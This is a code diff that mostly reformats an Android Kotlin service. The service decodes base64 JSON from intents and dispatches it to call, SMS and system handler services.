@@ -5,15 +5,15 @@ import android.content.Intent
 import android.os.FileObserver
 import android.os.IBinder
 import android.util.Log
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.channels.Channel
-import kotlinx.coroutines.launch
-import org.json.JSONObject
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
+import kotlinx.coroutines.channels.Channel
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.launch
+import org.json.JSONObject
 
 class JSONProcessingService : Service() {
     companion object {
@@ -32,7 +32,10 @@ class JSONProcessingService : Service() {
         super.onCreate()
 
         val outputDir = File(outputDirPath)
-        if (!outputDir.exists()) outputDir.mkdirs()
+
+        if (!outputDir.exists()) {
+            outputDir.mkdirs()
+        }
 
         // Start foreground service with a notification
         val notification = Notify.createNotification(
@@ -49,7 +52,7 @@ class JSONProcessingService : Service() {
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
-        intent?.let {
+        intent.let {
             serviceScope.launch {
                 intentChannel.send(it)
             }
@@ -64,12 +67,13 @@ class JSONProcessingService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        serviceJob.cancel() // Cancel all running coroutines
+        serviceJob.cancel()  // Cancel all running coroutines
     }
 
     private suspend fun processQueue() {
         for (intent in intentChannel) {
             val encodedData = intent.getStringExtra("extra_data")
+
             if (encodedData != null) {
                 val data = String(android.util.Base64.decode(encodedData, android.util.Base64.DEFAULT))
                 processJsonData(data)
@@ -102,12 +106,14 @@ class JSONProcessingService : Service() {
             "call" -> startService(Intent(this, CallService::class.java).apply { putExtra("json", json.toString()) })
             "sms" -> startService(Intent(this, SMSService::class.java).apply { putExtra("json", json.toString()) })
             "system" -> startService(Intent(this, SystemService::class.java).apply { putExtra("json", json.toString()) })
+
             else -> Log.e(TAG, "Unknown type ${json.optString("type")}")
         }
     }
 
     private fun writeResponse(requestId: String, responseData: JSONObject) {
         val outputDir = File(outputDirPath)
+
         if (!outputDir.exists()) {
             outputDir.mkdirs()
         }
